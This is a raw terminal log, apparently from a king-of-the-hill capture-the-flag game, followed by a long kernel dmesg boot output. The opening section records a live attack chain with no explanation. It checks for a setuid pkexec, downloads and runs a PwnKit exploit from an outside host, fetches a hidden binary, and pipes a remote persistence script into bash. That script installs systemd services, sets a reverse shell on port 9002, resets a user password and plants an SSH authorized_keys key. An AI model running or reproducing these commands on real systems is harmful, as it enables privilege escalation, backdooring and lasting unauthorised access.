sh: 0: can't access tty; job control turned off
$ ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
$ cd /tmp
$ wget http://10.11.55.164/PwnKit && chmod +x PwnKit && ./PwnKit
--2023-12-08 23:00:35--  http://10.11.55.164/PwnKit
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ...PwnKit...

     0K .......... .......                                    100% 94.2K=0.2s

2023-12-08 23:00:36 (94.2 KB/s) - ...PwnKit... saved [18040/18040]

mesg: ttyname failed: Inappropriate ioctl for device
rm Pwn*
cd /etc && mkdir .k && cd .k && wget http://10.11.55.164/f && chmod +x f && ./f
--2023-12-08 23:00:41--  http://10.11.55.164/f
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 780040 (762K) [application/octet-stream]
Saving to: 'f'

     0K .......... .......... .......... .......... ..........  6%  134K 5s
    50K .......... .......... .......... .......... .......... 13%  268K 4s
   100K .......... .......... .......... .......... .......... 19%  273K 3s
   150K .......... .......... .......... .......... .......... 26%  271K 3s
   200K .......... .......... .......... .......... .......... 32% 1.06M 2s
   250K .......... .......... .......... .......... .......... 39%  341K 2s
   300K .......... .......... .......... .......... .......... 45%  270K 2s
   350K .......... .......... .......... .......... .......... 52%  274K 1s
   400K .......... .......... .......... .......... .......... 59% 6.41M 1s
   450K .......... .......... .......... .......... .......... 65%  289K 1s
   500K .......... .......... .......... .......... .......... 72% 6.97M 1s
   550K .......... .......... .......... .......... .......... 78% 9.46M 0s
   600K .......... .......... .......... .......... .......... 85% 7.05M 0s
   650K .......... .......... .......... .......... .......... 91% 2.17M 0s
   700K .......... .......... .......... .......... .......... 98%  349K 0s
   750K .......... .                                          100% 6.29M=1.9s

2023-12-08 23:00:43 (411 KB/s) - 'f' saved [780040/780040]

cd
ls
flag
king.txt
koth
cat king.txt
MatheuZSec

curl -sL http://10.11.55.164/persistence.sh | bash
--2023-12-08 23:00:49--  http://10.11.55.164/c
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 762816 (745K) [application/octet-stream]
Saving to: 'c'

     0K .......... .......... .......... .......... ..........  6%  135K 5s
    50K .......... .......... .......... .......... .......... 13%  270K 4s
   100K .......... .......... .......... .......... .......... 20%  274K 3s
   150K .......... .......... .......... .......... .......... 26% 6.64M 2s
   200K .......... .......... .......... .......... .......... 33%  279K 2s
   250K .......... .......... .......... .......... .......... 40% 7.95M 1s
   300K .......... .......... .......... .......... .......... 46% 7.14M 1s
   350K .......... .......... .......... .......... .......... 53% 10.8M 1s
   400K .......... .......... .......... .......... .......... 60% 8.08M 1s
   450K .......... .......... .......... .......... .......... 67%  305K 1s
   500K .......... .......... .......... .......... .......... 73% 6.82M 0s
   550K .......... .......... .......... .......... .......... 80% 6.77M 0s
   600K .......... .......... .......... .......... .......... 87% 11.5M 0s
   650K .......... .......... .......... .......... .......... 93% 9.04M 0s
   700K .......... .......... .......... .......... ....      100% 9.56M=1.1s

2023-12-08 23:00:50 (653 KB/s) - 'c' saved [762816/762816]

proccess hid finish hiding the rest
--2023-12-08 23:00:50--  http://10.11.55.164/kothh.service
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 235 [application/octet-stream]
Saving to: 'kothh.service'

     0K                                                       100%  164K=0.001s

2023-12-08 23:00:51 (164 KB/s) - 'kothh.service' saved [235/235]

Created symlink /etc/systemd/system/multi-user.target.wants/kothh.service ... /etc/systemd/system/kothh.service.
--2023-12-08 23:00:51--  http://10.11.55.164/https.service
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 235 [application/octet-stream]
Saving to: 'https.service'

     0K                                                       100% 28.4M=0s

2023-12-08 23:00:51 (28.4 MB/s) - 'https.service' saved [235/235]

Created symlink /etc/systemd/system/multi-user.target.wants/https.service ... /etc/systemd/system/https.service.
systemd installed...
passwd: user 'systemd' does not exist
set passwd for steve...
rev on 9002...
Enter new UNIX password: Retype new UNIX password: passwd: password updated successfully
mkdir: cannot create directory '/root/.ssh': File exists
--2023-12-08 23:00:52--  http://10.11.55.164/id_rsa.pub
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 563 [application/vnd.exstream-package]
Saving to: 'authorized_keys'

     0K                                                       100%  313K=0.002s

2023-12-08 23:00:52 (313 KB/s) - 'authorized_keys' saved [563/563]

Downloading nyancat troll...
--2023-12-08 23:00:52--  http://10.11.55.164/nyan
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 814528 (795K) [application/octet-stream]
Saving to: 'nyan'

     0K .......... .......... .......... .......... ..........  6%  135K 6s
    50K .......... .......... .......... .......... .......... 12%  272K 4s
   100K .......... .......... .......... .......... .......... 18%  273K 3s
   150K .......... .......... .......... .......... .......... 25% 3.80M 2s
   200K .......... .......... .......... .......... .......... 31% 7.78M 2s
   250K .......... .......... .......... .......... .......... 37%  293K 2s
   300K .......... .......... .......... .......... .......... 44% 6.62M 1s
   350K .......... .......... .......... .......... .......... 50% 9.92M 1s
   400K .......... .......... .......... .......... .......... 56% 7.91M 1s
   450K .......... .......... .......... .......... .......... 62% 10.5M 1s
   500K .......... .......... .......... .......... .......... 69%  311K 0s
   550K .......... .......... .......... .......... .......... 75% 8.59M 0s
   600K .......... .......... .......... .......... .......... 81% 6.82M 0s
   650K .......... .......... .......... .......... .......... 88% 12.1M 0s
   700K .......... .......... .......... .......... .......... 94% 8.94M 0s
   750K .......... .......... .......... .......... .....     100% 9.29M=1.1s

2023-12-08 23:00:54 (698 KB/s) - 'nyan' saved [814528/814528]

done..
--2023-12-08 23:00:54--  http://10.11.55.164/pspy64
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: '/etc/pspy64'

     0K .......... .......... .......... .......... ..........  1%  131K 23s
    50K .......... .......... .......... .......... ..........  3%  271K 17s
   100K .......... .......... .......... .......... ..........  4%  270K 14s
   150K .......... .......... .......... .......... ..........  6% 7.57M 11s
   200K .......... .......... .......... .......... ..........  8% 7.76M 9s
   250K .......... .......... .......... .......... ..........  9%  288K 9s
   300K .......... .......... .......... .......... .......... 11% 6.66M 7s
   350K .......... .......... .......... .......... .......... 13% 8.10M 6s
   400K .......... .......... .......... .......... .......... 14% 8.27M 5s
   450K .......... .......... .......... .......... .......... 16% 10.3M 5s
   500K .......... .......... .......... .......... .......... 18%  314K 5s
   550K .......... .......... .......... .......... .......... 19% 5.68M 5s
   600K .......... .......... .......... .......... .......... 21% 10.6M 4s
   650K .......... .......... .......... .......... .......... 23% 8.19M 4s
   700K .......... .......... .......... .......... .......... 24% 8.61M 3s
   750K .......... .......... .......... .......... .......... 26% 9.74M 3s
   800K .......... .......... .......... .......... .......... 28% 12.9M 3s
   850K .......... .......... .......... .......... .......... 29% 12.1M 3s
   900K .......... .......... .......... .......... .......... 31% 10.9M 3s
   950K .......... .......... .......... .......... .......... 32% 14.4M 2s
  1000K .......... .......... .......... .......... .......... 34%  128K 3s
  1050K .......... .......... .......... .......... .......... 36%  253M 3s
  1100K .......... .......... .......... .......... .......... 37%  232M 3s
  1150K .......... .......... .......... .......... .......... 39%  311M 2s
  1200K .......... .......... .......... .......... .......... 41%  253M 2s
  1250K .......... .......... .......... .......... .......... 42%  303M 2s
  1300K .......... .......... .......... .......... .......... 44%  258M 2s
  1350K .......... .......... .......... .......... .......... 46%  294M 2s
  1400K .......... .......... .......... .......... .......... 47%  283M 2s
  1450K .......... .......... .......... .......... .......... 49%  309M 2s
  1500K .......... .......... .......... .......... .......... 51%  261M 1s
  1550K .......... .......... .......... .......... .......... 52% 80.2M 1s
  1600K .......... .......... .......... .......... .......... 54% 92.3M 1s
  1650K .......... .......... .......... .......... .......... 56% 92.3M 1s
  1700K .......... .......... .......... .......... .......... 57% 79.6M 1s
  1750K .......... .......... .......... .......... .......... 59% 88.7M 1s
  1800K .......... .......... .......... .......... .......... 61% 91.5M 1s
  1850K .......... .......... .......... .......... .......... 62% 77.3M 1s
  1900K .......... .......... .......... .......... .......... 64% 71.9M 1s
  1950K .......... .......... .......... .......... .......... 65% 93.2M 1s
  2000K .......... .......... .......... .......... .......... 67%  211M 1s
  2050K .......... .......... .......... .......... .......... 69%  122M 1s
  2100K .......... .......... .......... .......... .......... 70% 76.3M 1s
  2150K .......... .......... .......... .......... .......... 72% 88.6M 1s
  2200K .......... .......... .......... .......... .......... 74%  124M 1s
  2250K .......... .......... .......... .......... .......... 75% 96.1M 0s
  2300K .......... .......... .......... .......... .......... 77%  140M 0s
  2350K .......... .......... .......... .......... .......... 79%  277K 0s
  2400K .......... .......... .......... .......... .......... 80% 9.86M 0s
  2450K .......... .......... .......... .......... .......... 82% 6.77M 0s
  2500K .......... .......... .......... .......... .......... 84% 11.0M 0s
  2550K .......... .......... .......... .......... .......... 85% 8.12M 0s
  2600K .......... .......... .......... .......... .......... 87% 12.4M 0s
  2650K .......... .......... .......... .......... .......... 89% 9.13M 0s
  2700K .......... .......... .......... .......... .......... 90%  264K 0s
  2750K .......... .......... .......... .......... .......... 92%  341K 0s
  2800K .......... .......... .......... .......... .......... 93% 7.44M 0s
  2850K .......... .......... .......... .......... .......... 95% 29.7M 0s
  2900K .......... .......... .......... .......... .......... 97%  289M 0s
  2950K .......... .......... .......... .......... .......... 98%  244M 0s
  3000K .......... .......... .......... ..                   100%  286M=2.1s

2023-12-08 23:00:56 (1.39 MB/s) - '/etc/pspy64' saved [3104768/3104768]

w
 23:01:09 up 29 min,  0 users,  load average: 0.28, 1.01, 1.51
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
dmesg
[    0.000000] Linux version 4.15.0-91-generic (buildd@lgw01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020 (Ubuntu 4.15.0-91.92-generic 4.15.18)
[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-91-generic root=UUID=fd0bfeb3-175d-45d7-8f5d-b188ff4a4184 ro maybe-ubiquity console=ttyS0
[    0.000000] KERNEL supported cpus:
[    0.000000]   Intel GenuineIntel
[    0.000000]   AMD AuthenticAMD
[    0.000000]   Centaur CentaurHauls
[    0.000000] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.000000] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.000000] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.000000] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.000000] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' format.
[    0.000000] e820: BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009dfff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009e000-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000e0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003fffffff] usable
[    0.000000] BIOS-e820: [mem 0x00000000fc000000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.7 present.
[    0.000000] DMI: Xen HVM domU, BIOS 4.11.amazon 08/24/2006
[    0.000000] Hypervisor detected: Xen HVM
[    0.000000] Xen version 4.11.
[    0.000000] Xen Platform PCI: I/O protocol version 1
[    0.000000] Netfront and the Xen platform PCI driver have been compiled for this kernel: unplug emulated NICs.
[    0.000000] Blkfront and the Xen platform PCI driver have been compiled for this kernel: unplug emulated disks.
               You might have to change the root device
               from /dev/hd[a-d] to /dev/xvd[a-d]
               in your root= kernel command line option
[    0.000000] HVMOP_pagetable_dying not supported
[    0.000000] e820: update [mem 0x00000000-0x00000fff] usable ==> reserved
[    0.000000] e820: remove [mem 0x000a0000-0x000fffff] usable
[    0.000000] e820: last_pfn = 0x40000 max_arch_pfn = 0x400000000
[    0.000000] MTRR default type: write-back
[    0.000000] MTRR fixed ranges enabled:
[    0.000000]   00000-9FFFF write-back
[    0.000000]   A0000-BFFFF write-combining
[    0.000000]   C0000-FFFFF write-back
[    0.000000] MTRR variable ranges enabled:
[    0.000000]   0 base 0000F0000000 mask 3FFFF0000000 uncachable
[    0.000000]   1 disabled
[    0.000000]   2 disabled
[    0.000000]   3 disabled
[    0.000000]   4 disabled
[    0.000000]   5 disabled
[    0.000000]   6 disabled
[    0.000000]   7 disabled
[    0.000000] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.000000] found SMP MP-table at [mem 0x000fb9a0-0x000fb9af]
[    0.000000] Scanning 1 areas for low memory corruption
[    0.000000] BRK [0x29591000, 0x29591fff] PGTABLE
[    0.000000] BRK [0x29592000, 0x29592fff] PGTABLE
[    0.000000] BRK [0x29593000, 0x29593fff] PGTABLE
[    0.000000] BRK [0x29594000, 0x29594fff] PGTABLE
[    0.000000] RAMDISK: [mem 0x3117d000-0x348b5fff]
[    0.000000] ACPI: Early table checksum verification disabled
[    0.000000] ACPI: RSDP 0x00000000000EA020 000024 (v02 Xen   )
[    0.000000] ACPI: XSDT 0x00000000FC00C780 000054 (v01 Xen    HVM      00000000 HVML 00000000)
[    0.000000] ACPI: FACP 0x00000000FC00C440 0000F4 (v04 Xen    HVM      00000000 HVML 00000000)
[    0.000000] ACPI: DSDT 0x00000000FC003940 008A7E (v02 Xen    HVM      00000000 INTL 20090123)
[    0.000000] ACPI: FACS 0x00000000FC003900 000040
[    0.000000] ACPI: FACS 0x00000000FC003900 000040
[    0.000000] ACPI: APIC 0x00000000FC00C540 0000D8 (v02 Xen    HVM      00000000 HVML 00000000)
[    0.000000] ACPI: HPET 0x00000000FC00C690 000038 (v01 Xen    HVM      00000000 HVML 00000000)
[    0.000000] ACPI: WAET 0x00000000FC00C6D0 000028 (v01 Xen    HVM      00000000 HVML 00000000)
[    0.000000] ACPI: SSDT 0x00000000FC00C700 000031 (v02 Xen    HVM      00000000 INTL 20090123)
[    0.000000] ACPI: SSDT 0x00000000FC00C740 000033 (v02 Xen    HVM      00000000 INTL 20090123)
[    0.000000] ACPI: Local APIC address 0xfee00000
[    0.000000] No NUMA configuration found
[    0.000000] Faking a node at [mem 0x0000000000000000-0x000000003fffffff]
[    0.000000] NODE_DATA(0) allocated [mem 0x3ffd5000-0x3fffffff]
[    0.000000] tsc: Fast TSC calibration using PIT
[    0.000000] Zone ranges:
[    0.000000]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.000000]   DMA32    [mem 0x0000000001000000-0x000000003fffffff]
[    0.000000]   Normal   empty
[    0.000000]   Device   empty
[    0.000000] Movable zone start for each node
[    0.000000] Early memory node ranges
[    0.000000]   node   0: [mem 0x0000000000001000-0x000000000009dfff]
[    0.000000]   node   0: [mem 0x0000000000100000-0x000000003fffffff]
[    0.000000] Reserved but unavailable: 99 pages
[    0.000000] Initmem setup node 0 [mem 0x0000000000001000-0x000000003fffffff]
[    0.000000] On node 0 totalpages: 262045
[    0.000000]   DMA zone: 64 pages used for memmap
[    0.000000]   DMA zone: 21 pages reserved
[    0.000000]   DMA zone: 3997 pages, LIFO batch:0
[    0.000000]   DMA32 zone: 4032 pages used for memmap
[    0.000000]   DMA32 zone: 258048 pages, LIFO batch:31
[    0.000000] ACPI: PM-Timer IO Port: 0xb008
[    0.000000] ACPI: Local APIC address 0xfee00000
[    0.000000] IOAPIC[0]: apic_id 1, version 17, address 0xfec00000, GSI 0-47
[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 low level)
[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 low level)
[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 low level)
[    0.000000] ACPI: IRQ0 used by override.
[    0.000000] ACPI: IRQ5 used by override.
[    0.000000] ACPI: IRQ9 used by override.
[    0.000000] ACPI: IRQ10 used by override.
[    0.000000] ACPI: IRQ11 used by override.
[    0.000000] Using ACPI (MADT) for SMP configuration information
[    0.000000] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.000000] smpboot: Allowing 15 CPUs, 14 hotplug CPUs
[    0.000000] PM: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.000000] PM: Registered nosave memory: [mem 0x0009e000-0x0009ffff]
[    0.000000] PM: Registered nosave memory: [mem 0x000a0000-0x000dffff]
[    0.000000] PM: Registered nosave memory: [mem 0x000e0000-0x000fffff]
[    0.000000] e820: [mem 0x40000000-0xfbffffff] available for PCI devices
[    0.000000] Booting paravirtualized kernel on Xen HVM
[    0.000000] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645519600211568 ns
[    0.000000] random: get_random_bytes called from start_kernel+0x99/0x4fd with crng_init=0
[    0.000000] setup_percpu: NR_CPUS:8192 nr_cpumask_bits:15 nr_cpu_ids:15 nr_node_ids:1
[    0.000000] percpu: Embedded 45 pages/cpu s147456 r8192 d28672 u262144
[    0.000000] pcpu-alloc: s147456 r8192 d28672 u262144 alloc=1*2097152
[    0.000000] pcpu-alloc: [0] 00 01 02 03 04 05 06 07 [0] 08 09 10 11 12 13 14 -- 
[    0.000000] xen: PV spinlocks enabled
[    0.000000] PV qspinlock hash table entries: 256 (order: 0, 4096 bytes)
[    0.000000] Built 1 zonelists, mobility grouping on.  Total pages: 257928
[    0.000000] Policy zone: DMA32
[    0.000000] Kernel command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-91-generic root=UUID=fd0bfeb3-175d-45d7-8f5d-b188ff4a4184 ro maybe-ubiquity console=ttyS0
[    0.000000] Calgary: detecting Calgary via BIOS EBDA area
[    0.000000] Calgary: Unable to locate Rio Grande table in EBDA - bailing!
[    0.000000] Memory: 943956K/1048180K available (12300K kernel code, 2481K rwdata, 4264K rodata, 2432K init, 2712K bss, 104224K reserved, 0K cma-reserved)
[    0.000000] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=15, Nodes=1
[    0.000000] Kernel/User page tables isolation: enabled
[    0.000000] ftrace: allocating 39347 entries in 154 pages
[    0.004000] Hierarchical RCU implementation.
[    0.004000] 	RCU restricting CPUs from NR_CPUS=8192 to nr_cpu_ids=15.
[    0.004000] 	Tasks RCU enabled.
[    0.004000] RCU: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=15
[    0.004000] NR_IRQS: 524544, nr_irqs: 952, preallocated irqs: 16
[    0.004000] xen:events: Using 2-level ABI
[    0.004000] xen:events: Xen HVM callback vector for event delivery is enabled
[    0.004000] Console: colour dummy device 80x25
[    0.004000] Cannot get hvm parameter CONSOLE_EVTCHN (18): -22!
[    0.004000] console [ttyS0] enabled
[    0.004000] ACPI: Core revision 20170831
[    0.004000] ACPI: 3 ACPI AML tables successfully acquired and loaded
[    0.004000] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 30580167144 ns
[    0.004000] hpet clockevent registered
[    0.004014] APIC: Switch to symmetric I/O mode setup
[    0.008000] x2apic: IRQ remapping doesn't support X2APIC mode
[    0.012004] Switched APIC routing to physical flat.
[    0.022650] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=0 pin2=0
[    0.052000] tsc: Fast TSC calibration using PIT
[    0.072003] tsc: Detected 2299.944 MHz processor
[    0.076001] tsc: Detected 2300.018 MHz TSC
[    0.076010] Calibrating delay loop (skipped), value calculated using timer frequency.. 4600.03 BogoMIPS (lpj=9200072)
[    0.092003] pid_max: default: 32768 minimum: 301
[    0.096065] Security Framework initialized
[    0.100002] Yama: becoming mindful.
[    0.104037] AppArmor: AppArmor initialized
[    0.112233] Dentry cache hash table entries: 131072 (order: 8, 1048576 bytes)
[    0.120113] Inode-cache hash table entries: 65536 (order: 7, 524288 bytes)
[    0.128023] Mount-cache hash table entries: 2048 (order: 2, 16384 bytes)
[    0.136010] Mountpoint-cache hash table entries: 2048 (order: 2, 16384 bytes)
[    0.148090] Last level iTLB entries: 4KB 64, 2MB 8, 4MB 8
[    0.152003] Last level dTLB entries: 4KB 64, 2MB 0, 4MB 0, 1GB 4
[    0.156004] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.164003] Spectre V2 : Mitigation: Full generic retpoline
[    0.168003] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.176002] Speculative Store Bypass: Vulnerable
[    0.180030] MDS: Vulnerable: Clear CPU buffers attempted, no microcode
[    0.203880] clocksource: xen: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.212020] Xen: using vcpuop timer interface
[    0.212039] installing Xen timer for CPU 0
[    0.220108] smpboot: CPU0: Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz (family: 0x6, model: 0x4f, stepping: 0x1)
[    0.224061] cpu 0 spinlock event irq 53
[    0.228125] Performance Events: unsupported p6 CPU model 79 no PMU driver, software events only.
[    0.232061] Hierarchical SRCU implementation.
[    0.236665] NMI watchdog: Perf event create on CPU 0 failed with -2
[    0.240007] NMI watchdog: Perf NMI watchdog permanently disabled
[    0.244237] smp: Bringing up secondary CPUs ...
[    0.248006] smp: Brought up 1 node, 1 CPU
[    0.251614] smpboot: Max logical packages: 15
[    0.252005] smpboot: Total of 1 processors activated (4600.03 BogoMIPS)
[    0.256244] devtmpfs: initialized
[    0.260030] x86/mm: Memory block size: 128MB
[    0.264225] evm: security.selinux
[    0.267498] evm: security.SMACK64
[    0.268008] evm: security.SMACK64EXEC
[    0.271549] evm: security.SMACK64TRANSMUTE
[    0.272009] evm: security.SMACK64MMAP
[    0.276005] evm: security.apparmor
[    0.279797] evm: security.ima
[    0.280008] evm: security.capability
[    0.284105] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns
[    0.288028] futex hash table entries: 4096 (order: 6, 262144 bytes)
[    0.292133] pinctrl core: initialized pinctrl subsystem
[    0.296125] RTC time: 22:31:33, date: 12/08/23
[    0.300130] NET: Registered protocol family 16
[    0.304120] audit: initializing netlink subsys (disabled)
[    0.308145] audit: type=2000 audit(1702074693.821:1): state=initialized audit_enabled=0 res=1
[    0.312099] cpuidle: using governor ladder
[    0.316008] cpuidle: using governor menu
[    0.319523] ACPI: bus type PCI registered
[    0.320006] acpiphp: ACPI Hot Plug PCI Controller Driver version: 0.5
[    0.324733] PCI: Using configuration type 1 for base access
[    0.329111] HugeTLB registered 2.00 MiB page size, pre-allocated 0 pages
[    0.332292] ACPI: Added _OSI(Module Device)
[    0.336010] ACPI: Added _OSI(Processor Device)
[    0.340008] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.343479] ACPI: Added _OSI(Processor Aggregator Device)
[    0.344021] ACPI: Added _OSI(Linux-Dell-Video)
[    0.346956] ACPI: Added _OSI(Linux-Lenovo-NV-HDMI-Audio)
[    0.348029] ACPI: Added _OSI(Linux-HPI-Hybrid-Graphics)
[    0.351697] xen: --> pirq=16 -> irq=9 (gsi=9)
[    0.355643] ACPI: Interpreter enabled
[    0.356027] ACPI: (supports S0 S3 S4 S5)
[    0.359367] ACPI: Using IOAPIC for interrupt routing
[    0.360044] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.364819] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.416146] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.420018] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI]
[    0.424021] acpi PNP0A03:00: _OSC failed (AE_NOT_FOUND); disabling ASPM
[    0.428028] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended PCI configuration space under this bridge.
[    0.433539] acpiphp: Slot [0] registered
[    0.437958] acpiphp: Slot [3] registered
[    0.440725] acpiphp: Slot [4] registered
[    0.444454] acpiphp: Slot [5] registered
[    0.448664] acpiphp: Slot [6] registered
[    0.452740] acpiphp: Slot [7] registered
[    0.456674] acpiphp: Slot [8] registered
[    0.460632] acpiphp: Slot [9] registered
[    0.464623] acpiphp: Slot [10] registered
[    0.468592] acpiphp: Slot [11] registered
[    0.472827] acpiphp: Slot [12] registered
[    0.476140] acpiphp: Slot [13] registered
[    0.479882] acpiphp: Slot [14] registered
[    0.480684] acpiphp: Slot [15] registered
[    0.484644] acpiphp: Slot [16] registered
[    0.489120] acpiphp: Slot [17] registered
[    0.492866] acpiphp: Slot [18] registered
[    0.496808] acpiphp: Slot [19] registered
[    0.500960] acpiphp: Slot [20] registered
[    0.504956] acpiphp: Slot [21] registered
[    0.508818] acpiphp: Slot [22] registered
[    0.512905] acpiphp: Slot [23] registered
[    0.516851] acpiphp: Slot [24] registered
[    0.520925] acpiphp: Slot [25] registered
[    0.524762] acpiphp: Slot [26] registered
[    0.528709] acpiphp: Slot [27] registered
[    0.532837] acpiphp: Slot [28] registered
[    0.536895] acpiphp: Slot [29] registered
[    0.540916] acpiphp: Slot [30] registered
[    0.544778] acpiphp: Slot [31] registered
[    0.548811] PCI host bridge to bus 0000:00
[    0.552008] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.556010] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.560010] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.564009] pci_bus 0000:00: root bus resource [mem 0xf0000000-0xfbffffff window]
[    0.568010] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.571951] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.575410] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.579933] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.583724] pci 0000:00:01.1: reg 0x20: [io  0xc100-0xc10f]
[    0.585315] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.588009] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.592000] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.592009] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.597245] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.597330] * Found PM-Timer Bug on the chipset. Due to workarounds for a bug,
               * this clock source is slow. Consider trying other clock sources
[    0.602627] pci 0000:00:01.3: quirk: [io  0xb000-0xb03f] claimed by PIIX4 ACPI
[    0.606114] pci 0000:00:02.0: [1013:00b8] type 00 class 0x030000
[    0.607128] pci 0000:00:02.0: reg 0x10: [mem 0xf0000000-0xf1ffffff pref]
[    0.607674] pci 0000:00:02.0: reg 0x14: [mem 0xf3000000-0xf3000fff]
[    0.610609] pci 0000:00:02.0: BAR 0: assigned to efifb
[    0.613563] pci 0000:00:03.0: [5853:0001] type 00 class 0xff8000
[    0.614776] pci 0000:00:03.0: reg 0x10: [io  0xc000-0xc0ff]
[    0.615391] pci 0000:00:03.0: reg 0x14: [mem 0xf2000000-0xf2ffffff pref]
[    0.622529] ACPI: PCI Interrupt Link [LNKA] (IRQs *5 10 11)
[    0.624412] ACPI: PCI Interrupt Link [LNKB] (IRQs 5 *10 11)
[    0.628423] ACPI: PCI Interrupt Link [LNKC] (IRQs 5 10 *11)
[    0.632501] ACPI: PCI Interrupt Link [LNKD] (IRQs *5 10 11)
[    0.650506] xen:balloon: Initialising balloon driver
[    0.656235] SCSI subsystem initialized
[    0.660070] libata version 3.00 loaded.
[    0.660217] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.664000] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.664008] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.668008] vgaarb: loaded
[    0.670128] ACPI: bus type USB registered
[    0.672032] usbcore: registered new interface driver usbfs
[    0.675740] usbcore: registered new interface driver hub
[    0.676025] usbcore: registered new device driver usb
[    0.679911] EDAC MC: Ver: 3.0.0
[    0.681089] PCI: Using ACPI for IRQ routing
[    0.684009] PCI: pci_cache_line_size set to 64 bytes
[    0.684997] e820: reserve RAM buffer [mem 0x0009e000-0x0009ffff]
[    0.685121] NetLabel: Initializing
[    0.688008] NetLabel:  domain hash size = 128
[    0.691594] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.692027] NetLabel:  unlabeled traffic allowed by default
[    0.696652] HPET: 3 timers in total, 0 timers will be used for per-cpu timer
[    0.700037] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.704009] hpet0: 3 comparators, 64-bit 62.500000 MHz counter
[    0.710078] clocksource: Switched to clocksource xen
[    0.724268] VFS: Disk quotas dquot_6.6.0
[    0.727695] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.734128] AppArmor: AppArmor Filesystem Enabled
[    0.738665] pnp: PnP ACPI init
[    0.741602] system 00:00: [mem 0x00000000-0x0009ffff] could not be reserved
[    0.748329] system 00:00: Plug and Play ACPI device, IDs PNP0c02 (active)
[    0.748445] system 00:01: [io  0x08a0-0x08a3] has been reserved
[    0.754378] system 00:01: [io  0x0cc0-0x0ccf] has been reserved
[    0.759618] system 00:01: [io  0x04d0-0x04d1] has been reserved
[    0.765050] system 00:01: Plug and Play ACPI device, IDs PNP0c02 (active)
[    0.765090] xen: --> pirq=17 -> irq=8 (gsi=8)
